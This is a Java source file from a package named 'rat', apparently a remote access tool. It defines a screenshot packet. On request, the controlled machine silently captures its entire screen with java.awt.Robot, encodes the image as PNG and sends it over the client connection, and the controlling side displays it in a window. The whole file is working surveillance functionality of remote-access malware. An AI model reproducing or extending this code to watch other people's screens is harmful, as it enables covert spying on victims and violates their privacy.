package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import javax.imageio.ImageIO;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.rat.ActiveClient;

public final class ScreenshotPacket implements IPacket {
	
	private BufferedImage image;
	
	private byte type;
	
	private static final byte REQUEST = 0;
	private static final byte DATA = 1;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(100, 100, BufferedImage.TYPE_INT_RGB);
	private static final int SCREEN_WIDTH = 500;
	private static final int SCREEN_HEIGHT = 500;
	
	public ScreenshotPacket(final BufferedImage image) {
		this.image = image;
		
		type = DATA;
	}
	
	public ScreenshotPacket() {
		this(NO_IMAGE);
		
		type = REQUEST;
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeByte(type);
		
		if (type == REQUEST) {
			return;
		}
		
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		
		try {
			ImageIO.write(image, "PNG", out);
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
		
		final byte[] data = out.toByteArray();
		
		client.writeInt(data.length);
		client.write(data);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		type = client.readByte();
		
		if (type == REQUEST) {
			return;
		}
		
		final int length = client.readInt();
		final byte[] data = new byte[length];
		
		client.read(data);
		
		final ByteArrayInputStream in = new ByteArrayInputStream(data);
		
		try {
			image = ImageIO.read(in);
		} catch (final IOException ex) {
			image = NO_IMAGE;
			
			ex.printStackTrace();
		}
	}
	
	@Override
	public void execute(final ActiveClient client) {
		if (type == REQUEST) {
			final Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
			final Rectangle screenRect = new Rectangle(screen);
			
			try {
				final Robot robot = new Robot();
				
				image = robot.createScreenCapture(screenRect);
				type = DATA;
			} catch (final AWTException ex) {
				ex.printStackTrace();
			}
			
			client.addPacket(this);
		} else if (type == DATA) {
			final int width = image.getWidth();
			final int height = image.getHeight();
			
			final Screen screen = new Screen(width, height);
			
			screen.addListener(g -> {
				g.drawImage(image, 0, 0, width, height, null);
			});
			screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
			screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
			screen.show();
			screen.redraw();
		}
	}
	
}
